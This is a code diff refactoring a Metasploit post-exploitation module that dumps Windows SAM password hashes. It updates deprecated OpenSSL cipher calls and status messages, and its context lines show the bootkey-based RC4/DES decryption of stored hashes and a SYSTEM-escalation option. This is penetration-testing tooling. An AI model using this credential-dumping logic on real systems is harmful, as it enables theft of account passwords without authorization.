@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
@@ -32,7 +29,7 @@ class MetasploitModule < Msf::Post
       [
         OptBool.new('GETSYSTEM', [ false, 'Attempt to get SYSTEM privilege on the target host.', false])
 
-      ], self.class)
+      ])
     @smb_port = 445
     # Constants for SAM decryption
     @sam_lmpass   = "LMPASSWORD\x00"
@@ -50,7 +47,7 @@ class MetasploitModule < Msf::Post
     host = Rex::FileUtils.clean_path(sysinfo["Computer"])
     hash_file = store_loot("windows.hashes", "text/plain", session, "", "#{host}_hashes.txt", "Windows Hashes")
     print_status("Hashes will be saved to the database if one is connected.")
-    print_status("Hashes will be saved in loot in JtR password file format to:")
+    print_good("Hashes will be saved in loot in JtR password file format to:")
     print_status(hash_file)
     smart_hash_dump(datastore['GETSYSTEM'], hash_file)
   end
@@ -68,7 +65,7 @@ class MetasploitModule < Msf::Post
     hash = Digest::MD5.new
     hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
-    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+    rc4 = OpenSSL::Cipher.new("rc4")
     rc4.key = hash.digest
     hbootkey  = rc4.update(vf[0x80, 32])
     hbootkey << rc4.final
@@ -186,18 +183,18 @@ class MetasploitModule < Msf::Post
 
     des_k1, des_k2 = rid_to_key(rid)
 
-    d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d1 = OpenSSL::Cipher.new('des-ecb')
     d1.padding = 0
     d1.key = des_k1
 
-    d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d2 = OpenSSL::Cipher.new('des-ecb')
     d2.padding = 0
     d2.key = des_k2
 
     md5 = Digest::MD5.new
     md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
 
-    rc4 = OpenSSL::Cipher::Cipher.new('rc4')
+    rc4 = OpenSSL::Cipher.new('rc4')
     rc4.key = md5.digest
     okey = rc4.update(enchash)
 
